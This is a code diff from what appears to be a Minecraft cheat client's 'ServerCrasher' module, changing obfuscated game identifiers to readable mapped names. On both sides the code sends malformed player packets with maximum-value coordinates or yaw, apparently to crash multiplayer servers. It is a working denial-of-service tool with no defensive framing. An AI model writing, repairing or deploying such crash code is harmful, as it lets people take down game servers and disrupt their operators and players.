@@ -9,9 +9,9 @@ import dev.southside.module.Category;
 import dev.southside.module.Module;
 import dev.southside.orbit.EventHandler;
 import dev.southside.utils.misc.ClientUtils;
-import net.minecraft.class_243;
-import net.minecraft.class_2828.class_2829;
-import net.minecraft.class_2828.class_2831;
+import net.minecraft.util.math.Vec3d;
+import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.PositionAndOnGround;
+import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket.LookAndOnGround;
 
 public class ServerCrasher extends Module {
    public Dropdown mode = new Dropdown("Mode", "HighYaw", "HighYaw", "FarPosition", "InfYaw");
@@ -34,18 +34,18 @@ public class ServerCrasher extends Module {
    @Override
    public void onEnable() {
       if (!ClientUtils.nullCheck()) {
-         this.yaw = mc.field_1724.method_36454();
+         this.yaw = mc.player.getYaw();
          if (this.mode.isMode("FarPosition")) {
-            class_243 pos1 = new class_243(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
-            mc.field_1724
-               .field_3944
-               .method_52787(new class_2829(pos1.field_1352, pos1.field_1351, pos1.field_1350, mc.field_1724.method_24828(), mc.field_1724.field_5976));
+            Vec3d pos1 = new Vec3d(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
+            mc.player
+               .networkHandler
+               .sendPacket(new PositionAndOnGround(pos1.x, pos1.y, pos1.z, mc.player.isOnGround(), mc.player.horizontalCollision));
          }
 
          if (this.mode.isMode("InfYaw")) {
-            mc.field_1724
-               .field_3944
-               .method_52787(new class_2831(Float.MAX_VALUE, mc.field_1724.method_36455(), mc.field_1724.method_24828(), mc.field_1724.field_5976));
+            mc.player
+               .networkHandler
+               .sendPacket(new LookAndOnGround(Float.MAX_VALUE, mc.player.getPitch(), mc.player.isOnGround(), mc.player.horizontalCollision));
          }
 
          if (!this.mode.isMode("HighYaw")) {
